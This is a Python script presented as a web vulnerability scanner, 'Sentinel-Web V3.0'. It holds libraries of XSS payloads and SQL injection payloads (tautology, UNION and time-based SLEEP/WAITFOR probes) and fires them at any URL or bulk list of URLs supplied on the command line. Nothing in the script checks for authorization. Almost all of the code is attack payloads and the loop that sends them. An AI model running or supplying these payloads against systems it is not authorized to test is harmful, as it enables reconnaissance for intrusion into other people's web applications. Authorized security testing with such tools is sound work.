import requests
import time
import argparse
import sys
from colorama import Fore, Style, init

# Initialize Colors
init(autoreset=True)

# --- ADVANCED CONFIGURATION ---
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

def print_banner():
    print(Fore.CYAN + Style.BRIGHT + """
    ======================================================
       SENTINEL-WEB V3.0: Enterprise Vulnerability Scanner
       [+] Mode: Automated Payload Injection
       [+] Targets: SQLi (Blind/Error/Union) & XSS
    ======================================================
    """ + Style.RESET_ALL)

# --- PAYLOAD LIBRARY ---
def get_xss_payloads():
    return [
        "<script>alert('XSS')</script>",
        "\"><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "' onmouseover='alert(1)",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)//"
    ]

def get_sqli_payloads():
    return [
        # Classic Error Based
        "'",
        "' OR 1=1--",
        '" OR 1=1--',
        
        # Union Based
        "' UNION SELECT 1,2,3--",
        
        # Blind / Time Based (The dangerous ones)
        "' AND SLEEP(5)--",       # For Strings (e.g., user='admin')
        " AND SLEEP(5)",          # For Integers (e.g., id=1) <--- THIS FIXES IT
        "'; WAITFOR DELAY '0:0:5'--" # For MSSQL
    ]

# --- SCANNING LOGIC ---

def scan_url(url):
    print(Fore.YELLOW + f"\n[*] Starting Scan on Target: {url}")
    
    is_vulnerable = False
    
    # 1. Check XSS
    print(Fore.BLUE + "  [>] Testing Cross-Site Scripting (XSS)...")
    for payload in get_xss_payloads():
        target_url = f"{url}{payload}"
        try:
            # Send request
            response = requests.get(target_url, headers=HEADERS, timeout=5)
            # Analyze response
            if payload in response.text:
                print(Fore.RED + f"    [!] CRITICAL: XSS Found! Payload: {payload}")
                is_vulnerable = True
                break # Stop XSS scan if found (save time)
        except:
            pass
            
    if not is_vulnerable:
        print(Fore.GREEN + "    [-] XSS Safe")

    # 2. Check SQL Injection (Error & Blind)
    print(Fore.BLUE + "  [>] Testing SQL Injection (All Types)...")
    sqli_found = False
    
    for payload in get_sqli_payloads():
        target_url = f"{url}{payload}"
        
        try:
            # Measure time for Blind SQLi detection
            start_time = time.time()
            response = requests.get(target_url, headers=HEADERS, timeout=10)
            end_time = time.time()
            duration = end_time - start_time
            
            # Check 1: Error Based (Text in page)
            errors = ["syntax error", "mysql_fetch", "unclosed quotation mark"]
            for err in errors:
                if err in response.text.lower():
                    print(Fore.RED + f"    [!] HIGH: SQL Injection (Error-Based) Found! Payload: {payload}")
                    sqli_found = True
                    break
            
            # Check 2: Time Based (Duration > 5s)
            if "SLEEP" in payload and duration >= 5:
                print(Fore.RED + f"    [!] CRITICAL: Blind SQL Injection Found! (Server slept for {round(duration,2)}s)")
                sqli_found = True
                break
                
            if sqli_found: break

        except requests.exceptions.ReadTimeout:
             print(Fore.RED + f"    [!] CRITICAL: Blind SQLi (Timeout Triggered)")
             sqli_found = True
             break
        except:
            continue

    if not sqli_found:
        print(Fore.GREEN + "    [-] SQL Injection Safe")

# --- MAIN HANDLER ---
if __name__ == "__main__":
    print_banner()
    
    # Argument Parser (This lets you change URL from command line)
    parser = argparse.ArgumentParser(description="Sentinel-Web V3.0")
    
    # Option 1: Single URL
    parser.add_argument("-u", "--url", help="Target URL (e.g. http://site.com?id=1)")
    
    # Option 2: List of URLs (File)
    parser.add_argument("-l", "--list", help="Path to text file containing multiple URLs")
    
    args = parser.parse_args()

    if args.url:
        scan_url(args.url)
        
    elif args.list:
        try:
            with open(args.list, "r") as f:
                urls = f.read().splitlines()
                print(Fore.MAGENTA + f"[*] Loaded {len(urls)} targets from file.")
                for u in urls:
                    if u.strip():
                        scan_url(u)
        except FileNotFoundError:
            print(Fore.RED + "[!] Error: File not found.")
            
    else:
        print(Fore.RED + "[!] Error: Please provide a URL (-u) or a list (-l)")
        print("    Usage: python sentinel_v3.py -u http://target.com")
